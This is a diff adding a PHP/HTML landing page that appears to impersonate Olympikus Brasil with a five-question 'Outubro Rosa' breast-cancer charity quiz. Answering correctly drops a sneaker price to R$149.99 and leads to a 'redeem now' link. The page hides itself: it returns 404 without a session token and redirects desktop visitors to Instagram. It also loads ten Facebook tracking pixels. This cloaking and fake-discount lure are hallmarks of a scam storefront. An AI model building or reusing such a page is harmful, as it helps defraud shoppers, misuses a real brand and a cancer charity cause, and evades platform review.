@@ -1,0 +1,369 @@
+﻿<?php
+require("config/sessionToken.php");
+session_start();
+
+// Verifica se o token da sessão é verdadeiro
+if (!isset($_SESSION["sessionToken"]) || $_SESSION["sessionToken"] !== $sessionToken) {
+    http_response_code(404);
+    exit();
+}
+?>
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Olympikus Brasil - Tênis, Roupas e Artigos Esportivos</title>
+    <link rel="stylesheet" href="css/styles.css">
+
+    <link href="css/css2.css" rel="stylesheet">
+	
+<script src="../scripts/utms/latest.js" async="" defer=""></script>
+
+<script type="text/javascript">
+    if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
+      window.location.href = 'https://www.instagram.com/outubrorosa/';
+    }
+</script>
+<script type="text/javascript">
+	window.hasMobileFirstExtension = true;
+</script>
+
+<!-- CODIGO PIXEL -->
+<!-- Pixel Olymp OF -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1041379660977338');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none" src="../tr?id=1041379660977338&ev=PageView&noscript=1"></noscript>
+<!-- End Pixel Olymp OF -->
+
+<!-- Pixel Olymp OF2 -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '446744161191130');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none" src="../tr-1?id=446744161191130&ev=PageView&noscript=1"></noscript>
+<!-- End Pixel Olymp OF2 -->
+
+<!-- Pixel Olymp OF3 -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1047464630018443');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none" src="../tr-2?id=1047464630018443&ev=PageView&noscript=1"></noscript>
+<!-- End Pixel Olymp OF3 -->
+
+<!-- Pixel Olymp OF4 -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '564479966026216');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none" src="../tr-3?id=564479966026216&ev=PageView&noscript=1"></noscript>
+<!-- End Pixel Olymp OF4 -->
+
+<!-- Pixel Olymp OF5 -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '8438249472922222');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none" src="../tr-4?id=8438249472922222&ev=PageView&noscript=1"></noscript>
+<!-- End Pixel Olymp OF5 -->
+
+<!-- Olymp OF6 -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1256431215559148');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none" src="../tr-5?id=1256431215559148&ev=PageView&noscript=1"></noscript>
+<!-- End Olymp OF6 -->
+
+<!-- Olymp OF7 -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '8619059431489672');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none" src="../tr-6?id=8619059431489672&ev=PageView&noscript=1"></noscript>
+<!-- End Olymp OF7 -->
+
+<!-- Olymp OF8 -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1108042767993215');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none" src="../tr-7?id=1108042767993215&ev=PageView&noscript=1"></noscript>
+<!-- End Olymp OF8 -->
+
+<!-- Olymp OF9 -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '528912086513529');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none" src="../tr-8?id=528912086513529&ev=PageView&noscript=1"></noscript>
+<!-- End Olymp OF9 -->
+
+<!-- Olymp OF10 -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '575568434822837');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none" src="../tr-9?id=575568434822837&ev=PageView&noscript=1"></noscript>
+<!-- End Olymp OF10 -->
+</head>
+
+<body>
+    <div class="header">
+        <img src="images/LOGO1.png" alt="Logo">
+    </div>
+
+    <div class="titllee">
+        <h1>Bem-vindo ao <br>Desafio Olympikus Outubro Rosa</h1>
+    </div>
+
+
+    <div class="container ">
+        <div class="content ">
+            <!-- Tela inicial do quiz -->
+            <div id="start-screen" class="quiz-screen ">
+
+                <p>Participe do nosso emocionante desafio especial Outubro Rosa da Olympikus e ganhe acesso a uma <strong>SUPER OFERTA!</strong>
+                    <br><br>
+                    Ao completar o desafio com sucesso, você terá acesso a uma oferta exclusiva do corre da causa, o novo <strong>Corre 4 - Outubro Rosa</strong>
+                </p>
+                <button id="start-quiz" class="btn">COMEÇAR DESAFIO</button>
+
+            </div>
+
+            <!-- Pergunta 1 -->
+            <div id="question-1" class="quiz-screen hidden">
+                <p>Qual é um dos principais benefícios da prática regular de corrida?</p>
+                <div class="options">
+                    <button class="option incorrect">Aumento da pressão arterial</button>
+                    <button class="option incorrect">Diminuição da resistência física</button>
+					<button class="option correct">Melhora da saúde cardiovascular</button>
+                </div>
+                <button class="btn next-btn">PRÓXIMA PERGUNTA</button>
+                
+                <div class="valor-total">
+                    <p>VALOR TOTAL: R$499,99</p>
+                </div>
+            </div>
+
+            <!-- Pergunta 2 -->
+            <div id="question-2" class="quiz-screen hidden">
+                <p>Em qual ano a Olympikus foi fundada?</p>
+                <div class="options">
+                    <button class="option incorrect">1990</button>
+                    <button class="option correct">1975</button>
+                    <button class="option incorrect">2000</button>
+                </div>
+                <button class="btn next-btn">PRÓXIMA PERGUNTA</button>
+                <div class="valor-desconto">
+                    <p>DESCONTO: -R$150,00</p>
+
+                </div>
+                <div class="valor-total">
+                    <p>VALOR TOTAL: R$349,99</p>
+                </div>
+            </div>
+
+            <!-- Pergunta 3 -->
+            <div id="question-3" class="quiz-screen hidden">
+                <p>Qual é uma das principais melhorias do Tênis Olympikus Corre 4 em comparação ao Corre 3?</p>
+                <div class="options">
+					<button class="option correct">Aumento da durabilidade da borracha Gripper em 40%</button>
+                    <button class="option incorrect">Redução do peso do tênis</button>
+                    <button class="option incorrect">Aumento do número de cores disponíveis</button>
+                </div>
+                <button class="btn next-btn">PRÓXIMA PERGUNTA</button>
+                <div class="valor-desconto">
+                    <p>DESCONTO: -R$100,00</p>
+
+                </div>
+                <div class="valor-total">
+                    <p>VALOR TOTAL: R$249,99</p>
+                </div>
+            </div>
+
+            <!-- Pergunta 4 -->
+            <div id="question-4" class="quiz-screen hidden">
+                <p>Qual é o principal objetivo da campanha Outubro Rosa?</p>
+                <div class="options">
+                    <button class="option incorrect">Promover o câncer de pulmão</button>
+                    <button class="option incorrect">Incentivar a prática de esportes</button>
+					<button class="option correct">Conscientizar sobre o câncer de mama</button>
+                </div>
+                <button class="btn next-btn">PRÓXIMA PERGUNTA</button>
+                <div class="valor-desconto">
+                    <p>DESCONTO: -R$55,00</p>
+
+                </div>
+                <div class="valor-total">
+                    <p>VALOR TOTAL: R$194,99</p>
+                </div>
+            </div>
+
+            <!-- Pergunta 5 -->
+            <div id="question-5" class="quiz-screen hidden">
+                <p>Qual é o destino dos lucros das vendas do Tênis Olympikus Corre 4 Outubro Rosa?</p>
+                <div class="options">
+                    <button class="option correct">Santa Casa de Porto Alegre</button>
+                    <button class="option incorrect">Hospital das Clínicas</button>
+                    <button class="option incorrect">Abrigos de animais</button>
+                </div>
+                <button class="btn next-btn">PRÓXIMA PERGUNTA</button>
+                <div class="valor-desconto">
+                    <p>DESCONTO: -R$45,00</p>
+
+                </div>
+                <div class="valor-total">
+                    <p>VALOR TOTAL: R$149,99</p>
+                </div>
+            </div>
+
+
+
+            <!-- Tela de conclusão do quiz -->
+            <div id="end-screen" class="quiz-screen hidden">
+                <h2>PARABÉNS!</h2><br>
+                <p class="p-resgate">Você acaba de ganhar um super desconto no CORRE DA CAUSA!<br><b>O Corre 4 - Edição Especial Outubro Rosa<br><br></b>DE R$499,99<br><b>POR APENAS R$149,99</b></p>
+                <a href="tenis-corre-4-outubro-rosa/index.htm" class="btn btn-resgate" id="umdoistrestplink1">RESGATAR AGORA</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- popUp para selecionar alguma pergunta -->
+    <div class="selecione-resposta hidden ">
+        <p class="selecione-resposta-p">SELECIONE UMA PERGUNTA!</p>
+        <button class="btn back-btn">VOLTAR</button>
+    </div>
+
+
+    <!-- popUp para selecionar alguma pergunta -->
+    <div class="dica ">
+        <div class="dica-1 hidden popUp-dica">
+            <p class="dica-errado">Resposta errada, tente novamente para resgatar o prêmio!</p><br>
+            <p class="dica-p">
+                Dica: Pense em como a corrida pode impactar a saúde do coração e o bem-estar geral.
+            </p>
+            <button class="btn back-btn">TENTAR NOVAMENTE</button>
+        </div>
+
+        <div class="dica-2 hidden popUp-dica">
+            <p class="dica-errado">Resposta errada, tente novamente para resgatar o prêmio!</p><br>
+            <p class="dica-p">
+                Dica: A marca foi criada em um período em que o esporte estava começando a ganhar popularidade no Brasil, bem antes do novo milênio.
+            <button class="btn back-btn">TENTAR NOVAMENTE</button>
+        </p></div>
+
+        <div class="dica-3 hidden popUp-dica">
+            <p class="dica-errado">Resposta errada, tente novamente para resgatar o prêmio!</p><br>
+            <p class="dica-p">
+               Dica: Considere a importância da durabilidade em calçados esportivos e como isso pode influenciar o desempenho nas corridas.
+            </p>
+            <button class="btn back-btn">TENTAR NOVAMENTE</button>
+        </div>
+
+        <div class="dica-4 hidden popUp-dica">
+            <p class="dica-errado">Resposta errada, tente novamente para resgatar o prêmio!</p><br>
+            <p class="dica-p">
+                Dica: Pense em campanhas que buscam aumentar a conscientização sobre doenças e a importância do diagnóstico precoce.
+            </p>
+            <button class="btn back-btn">TENTAR NOVAMENTE</button>
+        </div>
+
+        <div class="dica-5 hidden popUp-dica">
+            <p class="dica-errado">Resposta errada, tente novamente para resgatar o prêmio!</p><br>
+            <p class="dica-p">
+                Dica: Lembre-se de que o lucro é destinado a uma instituição de saúde que apoia o tratamento e a conscientização sobre o câncer.
+            </p>
+            <button class="btn back-btn">TENTAR NOVAMENTE</button>
+        </div>
+    </div>
+
+    <div class="footer">
+
+    </div>
+    <script src="js/script.js"></script>
+	</body>
+</html>
